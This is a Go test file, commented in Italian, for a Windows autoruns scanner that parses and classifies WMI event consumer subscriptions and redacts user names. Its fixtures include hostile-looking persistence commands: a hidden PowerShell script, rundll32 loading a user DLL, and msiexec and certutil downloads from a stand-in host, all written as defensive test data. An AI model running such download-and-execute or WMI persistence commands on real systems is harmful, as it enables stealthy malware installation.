package autoruns

import (
	"encoding/json"
	"strings"
	"testing"

	"lanterna/internal/scan"
)

const wmiJSON = `{"items":[
 {"ns":"root/subscription","cls":"NTEventLogEventConsumer","name":"SCM Event Log Consumer","bound":true},
 {"ns":"root/subscription","cls":"CommandLineEventConsumer","name":"Updater","bound":true,"exe":"","cmd":"powershell.exe -NoP -W Hidden -File C:\\ProgramData\\u.ps1"},
 {"ns":"root/subscription","cls":"CommandLineEventConsumer","name":"Exe","bound":false,"exe":"C:\\Windows\\System32\\rundll32.exe","cmd":"rundll32.exe C:\\Users\\anna\\x.dll,Go"},
 {"ns":"root/default","cls":"ActiveScriptEventConsumer","name":"Script di anna","bound":true,"engine":"VBScript","sfile":"","len":1234},
 {"ns":"root/subscription","cls":"ActiveScriptEventConsumer","name":"File","bound":true,"engine":"JScript","sfile":"C:\\Users\\anna\\s.js","len":0},
 {"ns":"root/subscription","cls":"SMTPEventConsumer","name":"Posta","bound":false}
],"errors":{"root/default":"AccessDenied"}}`

func TestWMI(t *testing.T) {
	w, err := parseWMI([]byte(wmiJSON))
	if err != nil {
		t.Fatal(err)
	}
	if len(w.Items) != 6 || !deniedCode(w.Errors["root/default"]) || deniedCode("0x80041010") {
		t.Fatalf("WMI: %+v", w)
	}
	rd := testReader(newFakeEnv())
	var items []item
	for _, c := range w.Items {
		items = append(items, rd.consumerItem(c))
	}
	if e := items[0].entry; e.Consumer != "eventlog" || !e.Bound || e.Namespace != `root\subscription` || items[0].file != "" {
		t.Errorf("registro eventi: %+v", e)
	}
	if it := items[1]; it.entry.Consumer != "commandline" || it.target != `C:\ProgramData\u.ps1` || it.file != `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` && it.file != `C:\Windows\System32\powershell.exe` {
		t.Errorf("riga di comando: %+v", it)
	}
	if it := items[2]; it.file != `C:\Windows\System32\rundll32.exe` || it.target != `C:\Users\anna\x.dll` || it.entry.Enabled || it.entry.Command != `rundll32.exe %USERPROFILE%\x.dll,Go` {
		t.Errorf("ExecutablePath e target: %+v", it)
	}
	if it := items[3]; !it.interpreted || it.entry.Command != "VBScript: script incorporato di 1234 caratteri (testo non letto)" || it.entry.Name != "Script di ‹utente›" || it.entry.Namespace != `root\default` {
		t.Errorf("script incorporato: %+v", it)
	}
	if it := items[4]; it.file != `C:\Users\anna\s.js` || it.entry.Command != `JScript: %USERPROFILE%\s.js` {
		t.Errorf("file di script: %+v", it)
	}
	if ConsumerKind("SMTPEventConsumer") != "smtp" || ConsumerKind("LogFileEventConsumer") != "logfile" || ConsumerKind("AltroConsumer") != "other" {
		t.Error("ConsumerKind")
	}
	b, _ := json.Marshal(items[3].entry)
	if strings.Contains(string(b), "anna") {
		t.Errorf("nome dell'utente: %s", b)
	}
}

// B3 ed E2: una sottoscrizione che avvia un programma di Windows firmato da
// Microsoft (msiexec, certutil, bitsadmin...) si elenca, perché il motore la
// giudichi; così anche «SCM Event Log Consumer», che il motore riconosce.
func TestWMIListed(t *testing.T) {
	rd := testReader(newFakeEnv(`C:\Windows\System32\msiexec.exe`, `C:\Windows\System32\certutil.exe`))
	var items []item
	for _, c := range []psConsumer{
		{NS: "root/subscription", Class: "CommandLineEventConsumer", Name: "Msi", Bound: true, Exe: `C:\Windows\System32\msiexec.exe`, Cmd: `msiexec.exe /q /i http://example.invalid/x.msi`},
		{NS: "root/subscription", Class: "CommandLineEventConsumer", Name: "Cert", Bound: true, Cmd: `C:\Windows\System32\certutil.exe -urlcache -f http://example.invalid/x C:\Users\Public\x.exe`},
		{NS: "root/subscription", Class: "CommandLineEventConsumer", Name: "Msi2", Bound: true, Exe: `C:\Windows\System32\msiexec.exe`, Cmd: `msiexec.exe /x {11111111-2222-3333-4444-555555555555}`},
		{NS: "root/subscription", Class: "ActiveScriptEventConsumer", Name: "Script", Bound: true, Engine: "VBScript", SFile: `C:\Windows\System32\x.vbs`},
		{NS: "root/subscription", Class: "NTEventLogEventConsumer", Name: "SCM Event Log Consumer", Bound: true},
	} {
		it := rd.consumerItem(c)
		// Come li verificherebbe Windows: file di Microsoft nella sua cartella.
		if it.file != "" {
			it.entry.File = msFile("windows")
		}
		items = append(items, it)
	}
	if items[0].file != `C:\Windows\System32\msiexec.exe` || !items[0].interpreted {
		t.Errorf("msiexec con un pacchetto in rete: %+v", items[0])
	}
	entries, counts := assemble(items)
	if len(entries) != 5 || counts["wmi"] != (scan.AutorunCount{Total: 5}) {
		t.Errorf("sottoscrizioni elencate %d, conteggi %+v", len(entries), counts)
	}
}
